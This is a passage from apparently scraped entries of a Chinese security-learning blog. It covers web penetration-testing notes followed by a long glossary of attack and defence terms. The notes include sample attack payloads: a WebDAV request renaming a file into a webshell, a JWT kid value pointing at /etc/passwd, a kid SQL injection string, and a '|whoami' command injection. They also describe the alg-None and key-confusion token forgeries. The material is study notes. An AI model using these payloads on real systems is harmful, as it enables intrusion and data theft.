request(&quot;a&quot;)%&gt;\n\n\n通过COPY重命名\nCOPY/1.txt HTTP1.1Host:127.0.0.1Destination:http://www.xxx.com/cmd.asp;.txt#将1.txt重命名为cmd.asp;.txt\n\n\n删除文件\nDELETE\n\n\n ASPX\n\n\n.NET环境搭建组合：Windows+IIS+ASPX+SQLserver\n\n\n.NET配置调试-信息泄露\nILSpy反编译\ndnSpy\n\n\n.NET项目-Web.config错误调试-信息泄露\n&lt;customErrors mode=&quot;Off&quot;&lt;/customErrors&gt;&lt;!--    自定义错误，三种状态&quot;Off&quot;、&quot;On&quot;、&quot;RemoteOnly&quot;--&gt;\n\n\n\n\n.NET常见安全问题-未授权访问\n\n找没有包含验证代码的文件\n验证代码文件有没有可以绕过\n\n\n\n PHP\n详见《PHP特性.md》\nPHP-Audit-Labs\n Apache HTTPD解析漏洞\n\n漏洞原理\n\n服务器解析某些精心构造的后缀文件时，会将其解析成网页脚本\nApache HTTPD是一款HTTP服务器，其2.1.0~2.4.29版本存在解析漏洞，解析PHP时，1.php\\x0A将按照.php进行解析\n上传一个1.php文件\n&lt;?php    phpinfo();?&gt;\n抓包时在文件名后加个空格，然后在hex里修改20为0a，放包后成功\n Java\n详见《Java安全》\nsecscan-authcheck\nWebGoat\nwebgoat白盒审计+漏洞测试\n\n\n通过目录遍历传shell至可执行的文件夹\n\n\n身份验证逻辑\n\n\n问题有很多选项：s1：你叫什么名字？张三s2：你的出生地？出生地s3...数据库中没有s3、s4即s3=null s4=mull此时传入s3= &amp; s4= 发送数据正确\n\n安全验证：固定接收的数据：s0、s1\n不固定：s0、s1判断数据→正常\n​\t\ts2、s3不在数据库或者变量内→非法\n\n\nJWT：JSON Web令牌（JWT）验证用户的身份\n\nJWT原理及常见攻击方式\n\n判定网站是否采用JWT验证;\n数据包中Cookie可明确看到JWT特有的字符串格式：三部分，以点为间格\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\nJWT解密\n\n绕过：\n\n空加密算法\n\n在header中指定alg为None\n若某天开发人员在生产环境中开启了空加密算法，缺少签名算法，jwt保证信息不被篡改的功能就失效了。攻击者只需要把alg字段设置为None，就可以在payload中构造身份信息，伪造用户身份。\n\n修改RSA加密算法为HMAC\n\nJWT中最常用的两种算法为HMAC和RSA\n\n在HMAC和RSA算法中，都是使用私钥对signature字段进行签名，只有拿到了加密时使用的私钥，才有可能伪造token。\n\n假设一个Web应用，在JWT传输过程中使用RSA算法，密钥pem对JWT token进行签名，公钥pub对签名进行验证。\n&#123;    &quot;alg&quot; : &quot;RS256&quot;,    &quot;typ&quot; : &quot;jwt&quot;&#125;\n通常情况下密钥pem是无法获取到的，但是公钥pub却可以很容易通过某些途径读取到，这时，将JWT的加密算法修改为HMAC，即\n&#123;    &quot;alg&quot; : &quot;HS256&quot;,    &quot;typ&quot; : &quot;jwt&quot;&#125;\n同时使用获取到的公钥pub作为算法的密钥，对token进行签名，发送到服务器端。\n服务器端会将RSA的公钥（pub）视为当前算法（HMAC）的密钥，使用HS256算法对接收到的签名进行验证。\n\n爆破密钥\n\nc-jwt-cracker\n\n前提：\n\n知悉JWT使用的加密算法\n一段有效的、已签名的token\n签名用的密钥不复杂（弱密钥）\n\n\n\n\n修改KID参数\nkid是jwt header中的一个可选参数，全称是key ID，它用于指定加密算法的密钥\n&#123;    &quot;alg&quot; : &quot;HS256&quot;,    &quot;typ&quot; : &quot;jwt&quot;,    &quot;kid&quot; : &quot;/home/jwt/.ssh/pem&quot;&#125;\n因为该参数可以由用户输入，所以也可能造成一些安全问题。\n\n\n任意文件读取\nkid参数用于读取密钥文件，但系统并不会知道用户想要读取的到底是不是密钥文件，所以，如果在没有对参数进行过滤的前提下，攻击者是可以读取到系统的任意文件的。\n&#123;    &quot;alg&quot; : &quot;HS256&quot;,    &quot;typ&quot; : &quot;jwt&quot;,    &quot;kid&quot; : &quot;/etc/passwd&quot;&#125;\n\n\nSQL注入\nkid也可以从数据库中提取数据，这时候就有可能造成SQL注入攻击，通过构造SQL语句来获取数据或者是绕过signature的验证\n&#123;  ``&quot;alg&quot;` `: ``&quot;HS256&quot;``,  ``&quot;typ&quot;` `: ``&quot;jwt&quot;``,  ``&quot;kid&quot;` `: ``&quot;key11111111&#x27; || union select &#x27;secretkey&#x27; -- &quot;&#125;\n\n\n命令注入\n对kid参数过滤不严也可能会出现命令注入问题，但是利用条件比较苛刻。如果服务器后端使用的是Ruby，在读取密钥文件时使用了open函数，通过构造参数就可能造成命令注入。\n&quot;/path/to/key_file|whoami&quot;\n对于其他的语言，例如php，如果代码中使用的是exec或者是system来读取密钥文件，那么同样也可以造成命令注入，当然这个可能性就比较小了。\n\n\n\n\n修改JKU/X5U参数\n\n\nJKU的全称是&quot;JSON Web Key Set URL&quot;，用于指定一组用于验证令牌的密钥的URL。类似于kid，JKU也可以由用户指定输入数据，如果没有经过严格过滤，就可以指定一组自定义的密钥文件，并指定web应用使用该组密钥来验证token。\nX5U则以URI的形式数允许攻击者指定用于验证令牌的公钥证书或证书链，与JKU的攻击利用方式类似。\n\n信息泄露\n\nJWT保证的是数据传输过程中的完整性而不是机密性。\n由于payload是使用base64url编码的，所以相当于明文传输，如果在payload中携带了敏感信息（如存放密钥对的文件路径），单独对payload部分进行base64url解码，就可以读取到payload中携带的信息。\n\nbase64url加密是先做base64加密，然后再将-替代+及_替代/。\n\n\n\n访问控制\n\n\n隐藏属性：前端页面的自卫限制显示\n源码中已经暴露的id值、等级之类的编号，可尝试修改值测试是否可以切换到另外用户查看信息\n\n\n水平越权：同一级别用户权限的查看\n\n\n\n\n反序列化：后续讲\n\n\n JavaScript\nVulhub\nVulnhub\nJavaScript开发的Web应用和PHP、Java、.NET等区别在于即没有源代码，也可以通过浏览器的查看源代码获取真实代码（相当于JS开发的Web应用属于白盒测试（默认有源码参考））\n\n如何判定JS开发应用？\n\n源代码简短\n引入多个js文件\n一般有/static/js/app.js等顺序的js文件\ncookie中有connect.sid\n\n如何获取更多的js文件？\n\nJSFinder\nPacker-Fuzzer\n扫描器后缀替换字典\n\n如何快速获取价值代码？\n\nmethod:“get”\nhttp.get(&quot;\nmethod:“post”\nhttp.post(&quot;\n$.ajax\nservice.httppost\nservice.httpget\n Python\n\nPython文件反编译\nPython-Web-SSTI\nSSTI模板注入利用分析\n\n\n识别Python网站中间件：Werkzeug\npyc反编译1\npyc反编译2\nuncompyle2\n\nSSTI\n\n服务端接收用户恶意输入后未经任何处理就将其作为Web应用模板内容的部分。模板引擎在进行目标编译渲染的过程中执行了用户插入的可以破坏模板的语句，因为可能导致了敏感信息泄露\nrender_template_string()\nSSTI可能会出现的相关的地方\n\n","tags":["小迪"]},{"title":"01渗透测试前备知识","url":"/2024/02/23/01%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%89%8D%E5%A4%87%E7%9F%A5%E8%AF%86/","content":"作者：@11阳光\n本文为作者原创，转载请注明出处：https://www.cnblogs.com/sunny11/p/13583083.html#_label5\n 前备知识\n\n\nPOC：全称’ProofofConcept’，中文’概念验证’，常指一段漏洞证明的代码。\n\n\nEXP：全称’Exploit’，中文’利用’，指利用系统漏洞进行攻击的动作。\n\n\nPayload：中文’有效载荷’，指成功exploit之后，真正在目标系统执行的代码或指令。\n\n\nShellcode：简单翻译’shell代码’，是Payload的一种，由于其建立正向/反向shell而得名。\n\n\n渗透测试中常用的linux命令\n常用的cmd命令\nPowershell攻击指南黑客后渗透之道系列——基础篇\nPowershell攻击指南黑客后渗透之道系列——进阶利用\nPowershell攻击指南黑客后渗透之道系列——实战篇\n\n\n防火墙：正向连接、反向连接：Windows、Linux自带的防火墙策略：监测入站严格，出站宽松。\n\n正向：主动出去连接别人，分角度\n明白以什么为基准\n一般以当前我们渗透的攻击主机为参照物\n\n\n\n 一、攻击篇\n 1．攻击工具\n 肉鸡\n比喻那些可以被攻击者控制的电脑、手机、服务器或者其他摄像头、路由器等智能设备，用于发动网络攻击。\n 僵尸网络\n僵尸网络Botnet是指采用一种或多种传播手段，将大量主机感染病毒，从而在控制者和被感染主机之间所形成的一个可一对多控制的网络。\n 木马\n就是那些表面上伪装成了正常的程序，但是当这些程序运行时，就会获取系统的整个控制权限。\n有很多黑客就是热衷使用木马程序来控制别人的电脑，比如灰鸽子、Gh0st、PcShare等等。\n 网页木马\n表面上伪装成普通的网页或是将恶意代码直接插入到正常的网页文件中，当有人访问时，网页木马就会利用对方系统或者浏览器的漏洞自动将配置好的木马服务端植入到访问者的电脑上来自动执行将受影响的客户电脑变成肉鸡或纳入僵尸网络。\n Rootkit\nRootkit是攻击者用来隐藏自己的行踪和保留root（根权限，可以理解成Windows下的system或者管理员权限）访问权限的工具。\n通常，攻击者通过远程攻击的方式获得root访问权限，或者是先使用密码猜解（破解）的方式获得对系统的普通访问权限，进入系统后，再通过对方系统存在的安全漏洞获得系统的root或system权限。\n然后，攻击者就会在对方的系统中安装Rootkit，以达到自己长久控制对方的目的，Rootkit功能上与木马和后门很类似，但远比它们要隐蔽。\n 蠕虫病毒\n它是一类相对独立的恶意代码，利用了联网系统的开放性特点，通过可远程利用的漏洞自主地进行传播，受到控制终端会变成攻击的发起方，尝试感染更多的系统。\n蠕虫病毒的主要特性有：自我复制能力、很强的传播性、潜伏性、特定的触发性、很大的破坏性。\n 震网病毒\n又名Stuxnet病毒，是第一个专门定向攻击真实世界中基础（能源）设施的“蠕虫”病毒，比如核电站，水坝，国家电网。\n作为世界上首个网络“超级破坏性武器”，Stuxnet的计算机病毒已经感染了全球超过45000个网络，其目标伊朗的铀浓缩设备遭到的攻击最为严重。\n 勒索病毒\n主要以邮件、程序木马、网页挂马的形式进行传播。该病毒性质恶劣、危害极大，一旦感染将给用户带来无法估量的损失。这种病毒利用各种加密算法对文件进行加密，被感染者一般无法解密，必须拿到解密的私钥才有可能破解。\n 挖矿木马\n一种将PC、移动设备甚至服务器变为矿机的木马，通常由挖矿团伙植入，用于挖掘比特币从而赚取利益。\n 嗅探器（Sniffer）\n就是能够捕获网络报文的设备或程序。嗅探器的正当用处在于分析网络的流量，以便找出所关心的网络中潜在的问题。\n 恶意软件\n被设计来达到非授权控制计算机或窃取计算机数据等多种恶意行为的程序。\n 间谍软件\n一种能够在用户不知情的情况下，在其电脑、手机上安装后门，具备收集用户信息、监听、偷拍等功能的软件。\n 后门\n这是一种形象的比喻，入侵者在利用某些方法成功的控制了目标主机后，可以在对方的系统中植入特定的程序，或者是修改某些设置，用于访问、查看或者控制这台主机。\n这些改动表面上是很难被察觉的，就好象是入侵者偷偷的配了一把主人房间的钥匙，或者在不起眼处修了一条暗道，可以方便自身随意进出。\n通常大多数木马程序都可以被入侵者用于创建后门（BackDoor）。\n 弱口令\n指那些强度不够，容易被猜解的，类似123，abc这样的口令（密码）。\n 漏洞\n漏洞是在硬件、软件、协议的具体实现或系统安全策略上存在的缺陷，从而可以使攻击者能够在未授权的情况下访问或破坏系统。\n奇安信集团董事长齐向东在《漏洞》一书中指出，软件的缺陷是漏洞的一个主要来源，缺陷是天生的，漏洞是不可避免的。\n 远程命令执行漏洞\n由于系统设计实现上存在的漏洞，攻击者可能通过发送特定的请求或数据导致在受影响的系统上执行攻击者指定的任意命令。\n 0day漏洞\n指那些已经被攻击者发现掌握并开始利用，但还没有被包括受影响软件厂商在内的公众所知的漏洞，这类漏洞对攻击者来说有完全的信息优势，由于没有漏洞的对应的补丁或临时解决方案，防守方不知道如何防御，攻击者可以达成最大可能的威胁。\n 1day漏洞\n指漏洞信息已公开但仍未发布补丁的漏洞。此类漏洞的危害仍然较高，但往往官方会公布部分缓解措施，如关闭部分端口或者服务等。\n Nday漏洞\n指已经发布官方补丁的漏洞。通常情况下，此类漏洞的防护只需更新补丁即可，但由于多种原因，导致往往存在大量设备漏洞补丁更新不及时，且漏洞利用方式已经在互联网公开，往往此类漏洞是黑客最常使用的漏洞。\n例如在永恒之蓝事件中，微软事先已经发布补丁，但仍有大量用户中招。\n 2．攻击方法\n 挂马\n就是在别人的网站文件里面放入网页木马或者是将代码潜入到对方正常的网页文件里，以使浏览者中马。\n 挖洞\n指漏洞挖掘。\n 加壳\n就是利用特殊的算法，将EXE可执行程序或者DLL动态连接库文件的编码进行改变（比如实现压缩、加密），以达到缩小文件体积或者加密程序编码，甚至是躲过杀毒软件查杀的目的。\n目前较常用的壳有UPX，ASPack、PePack、PECompact、UPack、免疫007、木马彩衣等等。\n 溢出\n简单的解释就是程序对输入数据没有执行有效的边界检测而导致错误，后果可能是造成程序崩溃或者是执行攻击者的命令。溢出大致分为两类：堆溢出和栈溢出\n 缓冲区溢出\n攻击者向一个地址区输入这个区间存储不下的大量字符。在某些情况下，这些多余的字符可以作为“执行代码”来运行，因此足以使攻击者不受安全措施限制而获得计算机的控制权。\n 注入\nWeb安全头号大敌。攻击者把一些包含攻击代码当做命令或者查询语句发送给解释器，这些恶意数据可以欺骗解释器，从而执行计划外的命令或者未授权访问数据。\n注入攻击漏洞往往是应用程序缺少对输入进行安全性检查所引起的。注入漏洞通常能在SQL查询、LDAP查询、OS命令、程序参数等中出现。\n SQL注入\n注入攻击最常见的形式，主要是指Web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在Web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询或其他操作，导致数据库信息泄露或非授权操作数据表。\n 注入点\n即可以实行注入的地方，通常是一个涉及访问数据库的应用链接。根据注入点数据库的运行帐号的权限的不同，你所得到的权限也不同。\n 软件脱壳\n顾名思义，就是利用相应的工具，把在软件“外面”起保护作用的“壳”程序去除，还文件本来面目，这样再修改文件内容或进行分析检测就容易多了。\n 免杀\n就是通过加壳、加密、修改特征码、加花指令等等技术来修改程序，使其逃过杀毒软件的查杀。\n 花指令\n指几句汇编指令，让汇编语句进行一些跳转，使得杀毒软件不能正常地判断病毒文件的构造。通俗地说，就是杀毒软件是从头到脚按顺序来查找病毒，如果把病毒的头和脚颠倒位置，杀毒软件就找不到病毒了。\n 暴力破解\n简称“爆破”。黑客对系统中账号的每一个可能的密码进行高度密集的自动搜索，从而破坏安全并获得对计算机的访问权限。\n 洪水攻击\n是黑客比较常用的一种攻击技术，特点是实施简单，威力巨大，大多是无视防御的。\n从定义上说，攻击者对网络资源发送过量数据时就发生了洪水攻击，这个网络资源可以是router，switch，host，application等。\n洪水攻击将攻击流量比作成洪水，只要攻击流量足够大，就可以将防御手段打穿。\nDDoS攻击便是洪水攻击的一种。\n SYN攻击\n利用操作系统TCP协调设计上的问题执行的拒绝服务攻击，涉及TCP建立连接时三次握手的设计。\n DoS攻击\n拒绝服务攻击。攻击者通过利用漏洞或发送大量的请求导致攻击对象无法访问网络或者网站无法被访问。\n DDoS\n分布式DOS攻击，常见的UDP、SYN、反射放大攻击等等，就是通过许多台肉鸡一起向你发送一些网络请求信息，导致你的网络堵塞而不能正常上网。\n 抓鸡\n即设法控制电脑，将其沦为肉鸡。\n 端口扫描\n端口扫描是指发送一组端口扫描消息，通过它了解到从哪里可探寻到攻击弱点，并了解其提供的计算机网络服务类型，试图以此侵入某台计算机。\n 花指令\n通过加入不影响程序功能的多余汇编指令，使得杀毒软件不能正常的判断病毒文件的构造。说通俗点就是“杀毒软件是从头到脚按顺序来识别病毒。如果我们把病毒的头和脚颠倒位置，杀毒软件就找不到病毒了”。\n 反弹端口\n有人发现，防火墙对于连入的连接往往会进行非常严格的过滤，但是对于连出的连接却疏于防范。\n于是，利用这一特性，反弹端口型软件的服务端（被控制端）会主动连接客户端（控制端），就给人“被控制端主动连接控制端的假象，让人麻痹大意。\n 网络钓鱼\n攻击者利用欺骗性的电子邮件或伪造的Web站点等来进行网络诈骗活动。\n诈骗者通常会将自己伪装成网络银行、在线零售商和信用卡公司等可信的品牌，骗取用户的私人信息或邮件账号口令。\n受骗者往往会泄露自己的邮箱、私人资料，如信用卡号、银行卡账户、身份证号等内容。\n 鱼叉攻击\n鱼叉攻击是将用鱼叉捕鱼形象的引入到了网络攻击中，主要是指可以使欺骗性电子邮件看起来更加可信的网络钓鱼攻击，具有更高的成功可能性。\n不同于撒网式的网络钓鱼，鱼叉攻击往往更加具备针对性，攻击者往往“见鱼而使叉”。\n为了实现这一目标，攻击者将尝试在目标上收集尽可能多的信息。通常，组织内的特定个人存在某些安全漏洞。\n 钓鲸攻击\n捕鲸是另一种进化形式的鱼叉式网络钓鱼。它指的是针对高级管理人员和组织内其他高级人员的网络钓鱼攻击。\n通过使电子邮件内容具有个性化并专门针对相关目标进行定制的攻击。\n 水坑攻击\n顾名思义，是在受害者必经之路设置了一个“水坑（陷阱）”。\n最常见的做法是，黑客分析攻击目标的上网活动规律，寻找攻击目标经常访问的网站的弱点，先将此网站“攻破”并植入攻击代码，一旦攻击目标访问该网站就会“中招”。\n 嗅探\n嗅探指的是对局域网中的数据包进行截取及分析，从中获取有效信息。\n APT攻击\nAdvanced Persistent Threat，即高级可持续威胁攻击，指某组织在网络上对特定对象展开的持续有效的攻击活动。\n这种攻击活动具有极强的隐蔽性和针对性，通常会运用受感染的各种介质、供应链和社会工程学等多种手段实施先进的、持久的且有效的威胁和攻击。\n C2\nC2全称为Command and Control，命令与控制，常见于APT攻击场景中。作动词解释时理解为恶意软件与攻击者进行交互，作名词解释时理解为攻击者的“基础设施”。\n 供应链攻击\n是黑客攻击目标机构的合作伙伴，并以该合作伙为跳板，达到渗透目标用户的目的。\n一种常见的表现形式为，用户对厂商产品的信任，在厂商产品下载安装或者更新时进行恶意软件植入进行攻击。\n所以，在某些软件下载平台下载的时候，若遭遇捆绑软件，就得小心了！\n 社会工程学\n一种无需依托任何黑客软件，更注重研究人性弱点的黑客手法正在兴起，这就是社会工程学黑客技术。\n通俗而言是指利用人的社会学弱点实施网络攻击的一整套方法论，其攻击手法往往出乎人意料。\n世界第一黑客凯文·米特尼克在《反欺骗的艺术》中曾提到，人为因素才是安全的软肋。很多企业、公司在信息安全上投入大量的资金，最终导致数据泄露的原因，往往却是发生在人本身。\n 拿站\n指得到一个网站的最高权限，即得到后台和管理员名字和密码。\n 提权\n指得到你本没得到的权限，比如说电脑中非系统管理员就无法访问一些C盘的东西，而系统管理员就可以，通过一定的手段让普通用户提升成为管理员，让其拥有管理员的权限，这就叫提权。\n 渗透\n就是通过扫描检测你的网络设备及系统有没有安全漏洞，有的话就可能被入侵，就像一滴水透过一块有漏洞的木板，渗透成功就是系统被入侵。\n 横移\n指攻击者入侵后，从立足点在内部网络进行拓展，搜寻控制更多的系统。\n 跳板\n一个具有辅助作用的机器，利用这个主机作为一个间接工具，来入侵其他主机，一般和肉鸡连用。\n 黑页\n黑客攻击成功后，在网站上留下的黑客入侵成功的页面，用于炫耀攻击成果。\n 暗链\n看不见的网站链接，“暗链”在网站中的链接做得非常隐蔽，短时间内不易被搜索引擎察觉。\n它和友情链接有相似之处，可以有效地提高网站权重。\n 拖库\n拖库本来是数据库领域的术语，指从数据库中导出数据。\n在网络攻击领域，它被用来指网站遭到入侵后，黑客窃取其数据库文件。\n 撞库\n撞库是黑客通过收集互联网已泄露的用户和密码信息，生成对应的字典表，尝试批量登陆其他网站后，得到一系列可以登录的用户。\n很多用户在不同网站使用的是相同的帐号密码，因此黑客可以通过获取用户在A网站的账户从而尝试登录B网址，这就可以理解为撞库攻击。\n 暴库\n入侵网站的一种手法，通过恶意代码让网站爆出其一些敏感数据来。\n CC攻击\n即Challenge Collapsar，名字来源于对抗国内安全厂商绿盟科技早期的抗拒绝服务产品黑洞，攻击者借助代理服务器生成指向受害主机的涉及大量占用系统资源的合法请求，耗尽目标的处理资源，达到拒绝服务的目的。\n Webshell\nWebshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做是一种网页后门，可以上传下载文件，查看数据库，执行任意程序命令等。\n 跨站攻击\n通常简称为XSS，是指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。\n 中间人攻击\n中间人攻击是一种“间接”的入侵攻击，这种攻击模式是通过各种技术手段将受入侵者控制的一台计算机虚拟放置在网络连接中的两台通信计算机之间，通过拦截正常的网络通信数据，并进行数据篡改和嗅探，而这台计算机就称为“中间人”。\n 商业电子邮件攻击（BEC）\n也被称为“变脸诈骗”攻击，这是针对高层管理人员的攻击，攻击者通常冒充（盗用）决策者的邮件，来下达与资金、利益相关的指令；或者攻击者依赖社会工程学制作电子邮件，说服/诱导高管短时间进行经济交易。\n 电信诈骗\n是指通过电话、网络和短信方式，编造虚假信息，设置骗局，对受害人实施远程、非接触式诈骗，诱使受害人打款或转账的犯罪行为，通常以冒充他人及仿冒、伪造各种合法外衣和形式的方式达到欺骗的目的。\n 杀猪盘\n网络流行词，电信诈骗的一种，是一种网络交友诱导股票投资、赌博等类型的诈骗方式，“杀猪盘”则是“从业者们”自己起的名字，是指放长线“养猪”诈骗，养得越久，诈骗得越狠。\n ARP攻击\nARP协议的基本功能就是通过目标设备的IP地址，查询目标设备的MAC地址，以保证通信的进行。\n基于ARP协议的这一工作特性，黑客向对方计算机不断发送有欺诈性质的ARP数据包，数据包内包含有与当前设备重复的Mac地址，使对方在回应报文时，由于简单的地址重复错误而导致不能进行正常的网络通信。\n 欺骗攻击\n网络欺骗的技术主要有：HONEYPOT和分布式HONEYPOT、欺骗空间技术等。\n主要方式有：IP欺骗、ARP欺骗、DNS欺骗、Web欺骗、电子邮件欺骗、源路由欺骗（通过指定路由，以假冒身份与其他主机进行合法通信或发送假报文，使受攻击主机出现错误动作）、地址欺骗（包括伪造源地址和伪造中间站点）等。\n 物理攻击\n通俗理解，即采用物理接触而非技术手段达到网络入侵的目的，最常见的表现形式为插U盘。\n著名的震网病毒事件即通过插U盘的形式，感染了伊朗核设施。\n 打点\n指攻击者在入侵目标网络之前进行的侦察和准备工作。攻击者会通过扫描目标网络，收集关于网络拓扑、系统漏洞、开放端口等信息，以便确定最佳的攻击路径和方法。这些信息可以用于发起后续的攻击，例如渗透测试、漏洞利用或社会工程攻击。打点是黑客攻击的第一步，它为攻击者提供了有关目标网络的详细信息，从而增加了入侵的成功率。通俗说就是获取通向内网的一台服务器。\n 3．攻击者\n 黑产\n网络黑产，指以互联网为媒介，以网络技术为主要手段，为计算机信息系统安全和网络空间管理秩序，甚至国家安全、社会政治稳定带来潜在威胁（重大安全隐患）的非法行为。\n例如非法数据交易产业。\n 暗网\n暗网是利用加密传输、P2P对等网络、多点中继混淆等，为用户提供匿名的互联网信息访问的一类技术手段，其最突出的特点就是匿名性。\n 黑帽黑客\n以非法目的进行黑客攻击的人，通常是为了经济利益。他们进入安全网络以销毁、赎回、修改或窃取数据，或使网络无法用于授权用户。\n这个名字来源于这样一个历史：老式的黑白西部电影中，恶棍很容易被电影观众识别，因为他们戴着黑帽子，而“好人”则戴着白帽子。\n 白帽黑客\n是那些用自己的黑客技术来进行合法的安全测试分析的黑客，测试网络和系统的性能来判定它们能够承受入侵的强弱程度。\n 红帽黑客\n事实上最为人所接受的说法叫红客。\n红帽黑客以正义、道德、进步、强大为宗旨，以热爱祖国、坚持正义、开拓进取为精神支柱，红客通常会利用自己掌握的技术去维护国内网络的安全，并对外来的进攻进行还击。\n 红队\n通常指攻防演习中的攻击队伍。\n 蓝队\n通常指攻防演习中的防守队伍。\n 紫队\n攻防演习中新诞生的一方，通常指监理方或者裁判方。\n 二、防守篇\n 1．软硬件\n 加密机\n主机加密设备，加密机和主机之间使用TCP/IP协议通信，所以加密机对主机的类型和主机操作系统无任何特殊的要求。\n CA证书\n为实现双方安全通信提供了电子认证。\n在因特网、公司内部网或外部网中，使用数字证书实现身份识别和电子信息加密。\n数字证书中含有密钥对（公钥和私钥）所有者的识别信息，通过验证识别信息的真伪实现对证书持有者身份的认证。\n SSL证书\nSSL证书是数字证书的一种，类似于驾驶证、护照和营业执照的电子副本。\n因为配置在服务器上，也称为SSL服务器证书。\n 防火墙\n主要部署于不同网络或网络安全域之间的出口，通过监测、限制、更改跨越防火墙的数据流，尽可能地对外部屏蔽网络内部的信息、结构和运行状况，有选择地接受外部访问。\n IDS\n全称Intrusion Detection System，即入侵检测系统，用于在黑客发起进攻或是发起进攻之前检测到攻击，并加以拦截。\nIDS不同于防火墙，防火墙只能屏蔽入侵，而IDS却可以在入侵发生以前，通过一些信息来检测到即将发生的攻击或是入侵并作出反应。\n NIDS\n全称Network Intrusion Detection System，即网络入侵检测系统，主要用于检测Hacker或Cracker。\n通过网络进行的入侵行为。NIDS的运行方式有两种，一种是在目标主机上运行以监测其本身的通信信息，另一种是在一台单独的机器上运行以监测所有网络设备的通信信息，比如Hub、路由器。\n IPS\n全称Intrusion Prevention System，即入侵防御系统，目的在于及时识别攻击程序或有害代码及其克隆和变种，采取预防措施，先期阻止入侵，防患于未然。\n或者至少使其危害性充分降低。入侵预防系统一般作为防火墙和防病毒软件的补充来投入使用。\n 杀毒软件\n也称反病毒软件或防毒软件，是用于消除电脑病毒、特洛伊木马和恶意软件等计算机威胁的一类软件。\n 反病毒引擎\n通俗理解，就是一套判断特定程序行为是否为病毒程序（包括可疑的）的技术机制。\n例如奇安信自主研发的QOWL猫头鹰反病毒引擎。\n 防毒墙\n区别于部署在主机上的杀毒软件，防毒墙的部署方式与防火墙类似，主要部署于网络出口，用于对病毒进行扫描和拦截，因此防毒墙也被称为反病毒网关。\n 老三样\n通常指IDS、防火墙和反病毒三样历史最悠久安全产品。\n 告警\n指网络安全设备对攻击行为产生的警报。\n 误报\n也称为无效告警，通常指告警错误，即把合法行为判断成非法行为而产生了告警。\n目前，由于攻击技术的快速进步和检测技术的限制，误报的数量非常大，使得安全人员不得不花费大量时间来处理此类告警，已经成为困扰并拉低日常安全处置效率的主要原因。\n 漏报\n通常指网络安全设备没有检测出非法行为而没有产生告警。一旦出现漏报，将大幅增加系统被入侵的风险。\n NAC\n全称Network Access Control，即网络准入控制，其宗旨是防止病毒和蠕虫等新兴黑客技术对企业安全造成危害。\n借助NAC，客户可以只允许合法的、值得信任的终端设备（例如PC、服务器、PDA）接入网络，而不允许其它设备接入。\n 漏扫\n即漏洞扫描，指基于漏洞数据库，通过扫描等手段对指定的远程或者本地计算机系统的安全脆弱性进行检测，发现可利用漏洞的一种安全检测（渗透攻击）行为。\n UTM\n全称Unified Threat Management，即统一威胁管理，最早由IDC于2014年提出，即将不同设备的安全能力（最早包括入侵检测、防火墙和反病毒技术），集中在同一网关上，实现统一管理和运维。\n 网闸\n网闸是使用带有多种控制功能的固态开关读写介质，连接两个独立主机系统的信息安全设备。\n由于两个独立的主机系统通过网闸进行隔离，只有以数据文件形式进行的无协议摆渡。\n 堡垒机\n运用各种技术手段监控和记录运维人员对网络内的服务器、网络设备、安全设备、数据库等设备的操作行为，以便集中报警、及时处理及审计定责。\n 数据库审计\n能够实时记录网络上的数据库活动，对数据库操作进行细粒度审计的合规性管理，对数据库遭受到的风险行为进行告警，对攻击行为进行阻断。\n它通过对用户访问数据库行为的记录、分析和汇报，用来帮助用户事后生成合规报告、事故追根溯源，同时加强内外部数据库网络行为记录，提高数据资产安全。\n DLP\n数据防泄漏，通过数字资产的精准识别和策略制定，主要用于防止企业的指定数据或信息资产以违反安全策略规定的形式流出企业。\n VPN\n虚拟专用网，在公用网络上建立专用网络，进行加密通讯，通过对数据包的加密和数据包目标地址的转换实现远程访问。\n SD-WAN\n即软件定义广域网，这种服务用于连接广阔地理范围的企业网络、数据中心、互联网应用及云服务。\n这种服务的典型特征是将网络控制能力通过软件方式云化。\n通常情况下，SD-WAN都集成有防火墙、入侵检测或者防病毒能力。并且从目前的趋势来看，以安全为核心设计的SD-WAN正在崭露头角，包括奇安信、Fortinet等多家安全厂商开始涉足该领域，并提供了较为完备的内生安全设计。\n 路由器\n是用来连接不同子网的中枢，它们工作于OSI7层模型的传输层和网络层。\n路由器的基本功能就是将网络信息包传输到它们的目的地。一些路由器还有访问控制列表（ACLs），允许将不想要的信息包过滤出去。\n许多路由器都可以将它们的日志信息注入到IDS系统中，并且自带基础的包过滤（即防火墙）功能。\n 网关\n通常指路由器、防火墙、IDS、VPN等边界网络设备。\n WAF\n全称Web Application Firewall，即Web应用防火墙，是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。\n SOC\n全称Security Operations Center，即安全运行中心或者安全管理平台，通过建立一套实时的资产风险模型，协助管理员进行事件分析、风险分析、预警管理和应急响应处理的集中安全管理系统。\n LAS\n日志审计系统，主要功能是提供日志的收集、检索和分析能力，可为威胁检测提供丰富的上下文。\n NOC\n全称Network Operations Center，即网络操作中心或网络运行中心，是远程网络通讯的管理、监视和维护中心，是网络问题解决、软件分发和修改、路由、域名管理、性能监视的焦点。\n SIEM\n全称Security Information and Event Management，即安全信息和事件管理，负责从大量企业安全控件、主机操作系统、企业应用和企业使用的其他软件收集安全日志数据，并进行分析和报告。\n 上网行为管理\n是指帮助互联网用户控制和管理对互联网使用的设备。\n其包括对网页访问过滤、上网隐私保护、网络应用控制、带宽流量管理、信息收发审计、用户行为分析等。\n 蜜罐（Honeypot）\n是一个包含漏洞的系统，它摸拟一个或多个易受攻击的主机，给黑客提供一个容易攻击的目标。\n由于蜜罐没有其它任务需要完成，因此所有连接的尝试都应被视为是可疑的。\n蜜罐的另一个用途是拖延攻击者对其真正目标的攻击，让攻击者在蜜罐上浪费时间。\n蜜罐类产品包括蜜网、蜜系统、蜜账号等等。\n 